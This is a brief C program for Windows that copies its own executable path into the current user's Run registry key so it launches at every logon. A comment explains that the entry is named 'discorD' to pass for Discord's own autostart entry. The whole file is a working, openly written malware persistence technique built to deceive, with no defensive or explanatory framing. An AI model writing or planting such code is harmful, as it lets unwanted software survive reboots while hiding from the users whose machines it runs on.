#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <sys/stat.h>
#include <sys/types.h>

int main() {
	TCHAR szpath[MAX_PATH];
	DWORD pathlen = 0;
	// when the first parameter is set to NULL, it returns the file path of itself
	pathlen = GetModuleFileName(NULL, szpath, sizeof(szpath));
	if (pathlen == 0)
		return -1;

	HKEY new_val;
	if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &new_val) != ERROR_SUCCESS)
		return -1;

	DWORD pathlen_bytes = pathlen * sizeof(*szpath);
	// use a mask name like "discorD" since discord is putting itself into this registry key by default
	if(RegSetValueEx(new_val, TEXT("discorD"), 0, REG_SZ, (LPBYTE)szpath, pathlen_bytes) != ERROR_SUCCESS) {
		RegCloseKey(new_val);
		return -1;
	}
	RegCloseKey(new_val);
	return 0;
}
